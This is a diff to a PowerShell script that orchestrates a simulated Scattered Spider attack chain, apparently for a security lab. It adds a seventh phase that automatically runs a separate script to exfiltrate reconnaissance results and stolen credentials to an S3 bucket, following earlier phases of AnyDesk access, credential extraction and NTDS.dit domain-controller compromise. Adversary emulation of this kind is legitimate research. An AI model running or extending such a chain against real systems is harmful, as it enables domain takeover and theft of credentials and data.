@@ -1,6 +1,6 @@
 # === Complete Attack Chain Deployment ===
 # Simulates full Scattered Spider attack vector for security research
-# Phase 1: AnyDesk + Git → Phase 2: Repository Clone → Phase 3: Host Recon → Phase 4: AD Recon → Phase 5: Post-Exploit Cred Extraction → Phase 6: Post-Exploit DC Compromise
+# Phase 1: AnyDesk + Git → Phase 2: Repository Clone → Phase 3: Host Recon → Phase 4: AD Recon → Phase 5: Post-Exploit Cred Extraction → Phase 6: Post-Exploit DC Compromise → Phase 7: Data Exfiltration
 
 param(
     [string]$OrganizationID = "SecurityLab",
@@ -8,6 +8,7 @@ param(
     [string]$TargetUser = "Sherlock",
     [string]$DomainAdminUsername = "",
     [string]$DomainAdminPassword = "",
+    [string]$TargetS3Bucket = "",
     [switch]$SkipAnyDesk = $false,
     [switch]$AutoRecon = $false,
     [switch]$FullAttackChain = $false
@@ -182,6 +183,38 @@ if ($FullAttackChain -and ($DomainAdminUsername -and $DomainAdminPassword)) {
     Write-Host ""
 }
 
+# Phase 7: Data Exfiltration (if full attack chain)
+if ($FullAttackChain) {
+    Write-Host "=== PHASE 7: DATA EXFILTRATION ===" -ForegroundColor Cyan
+
+    $exfiltrationScript = ".\Deploy_Exfiltration.ps1"
+    if (Test-Path $exfiltrationScript) {
+        Write-Host "[*] Deploying data exfiltration to S3..." -ForegroundColor Yellow
+
+        try {
+            if ($TargetS3Bucket) {
+                Write-Host "[*] Target S3 bucket: $TargetS3Bucket" -ForegroundColor Gray
+                # Auto-execute exfiltration with target bucket
+                & $exfiltrationScript -TargetS3Bucket $TargetS3Bucket -AutoExecute
+            } else {
+                Write-Host "[*] No target bucket specified - performing S3 discovery only" -ForegroundColor Gray
+                # Auto-execute S3 discovery without target bucket
+                & $exfiltrationScript -AutoExecute
+            }
+
+            Write-Host "[+] Phase 7 Complete: Data exfiltration executed" -ForegroundColor Green
+        }
+        catch {
+            Write-Host "[!] Phase 7 failed: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "[!] Exfiltration requires AWS CLI and valid S3 bucket access" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "[!] Data exfiltration deployment script not found: $exfiltrationScript" -ForegroundColor Yellow
+    }
+
+    Write-Host ""
+}
+
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Magenta
 Write-Host " ATTACK CHAIN DEPLOYMENT COMPLETE" -ForegroundColor Magenta
@@ -204,20 +237,26 @@ if ($FullAttackChain) {
     } else {
         Write-Host "⚠ Phase 6: Skipped (no domain admin credentials provided)" -ForegroundColor Yellow
     }
+    if ($TargetS3Bucket) {
+        Write-Host "✓ Phase 7: Data exfiltration to S3 bucket: $TargetS3Bucket" -ForegroundColor Green
+    } else {
+        Write-Host "✓ Phase 7: S3 discovery executed (no target bucket specified)" -ForegroundColor Green
+    }
 }
 Write-Host "✓ Output directory: C:\Intel\Logs" -ForegroundColor Green
 Write-Host ""
 
 if ($FullAttackChain) {
     Write-Host "Complete Attack Chain Results:" -ForegroundColor Yellow
-    Write-Host "- Lab Scenario: Irene (local admin) → $TargetUser (domain admin) credential extraction" -ForegroundColor Gray
-    Write-Host "- Techniques: T1082, T1087, T1057, T1518, T1046, T1083, T1087.002, T1615, T1018, T1482, T1555, T1003, T1003.003" -ForegroundColor Gray
+    Write-Host "- Lab Scenario: Irene (local admin) → $TargetUser (domain admin) credential extraction → S3 exfiltration" -ForegroundColor Gray
+    Write-Host "- Techniques: T1082, T1087, T1057, T1518, T1046, T1083, T1087.002, T1615, T1018, T1482, T1555, T1003, T1003.003, T1041, T1567.002" -ForegroundColor Gray
     Write-Host "- Domain Compromise: NTDS.dit extraction for complete domain takeover" -ForegroundColor Gray
+    Write-Host "- Data Exfiltration: Reconnaissance results and credentials to S3 bucket" -ForegroundColor Gray
 } else {
     Write-Host "Next Steps:" -ForegroundColor Yellow
     Write-Host "- Use AnyDesk ID and password for remote connection" -ForegroundColor Gray
-    Write-Host "- Execute individual phases: .\Deploy_CredExtraction.ps1, .\Deploy_DCCompromise.ps1" -ForegroundColor Gray
-    Write-Host "- For full chain: .\Deploy_Complete_Chain.ps1 -FullAttackChain -DomainAdminUsername <user> -DomainAdminPassword <pass>" -ForegroundColor Gray
+    Write-Host "- Execute individual phases: .\Deploy_CredExtraction.ps1, .\Deploy_DCCompromise.ps1, .\Deploy_Exfiltration.ps1" -ForegroundColor Gray
+    Write-Host "- For full chain: .\Deploy_Complete_Chain.ps1 -FullAttackChain -TargetS3Bucket <bucket-name>" -ForegroundColor Gray
 }
 Write-Host "- Access results in: C:\Intel\Logs\" -ForegroundColor Gray
 
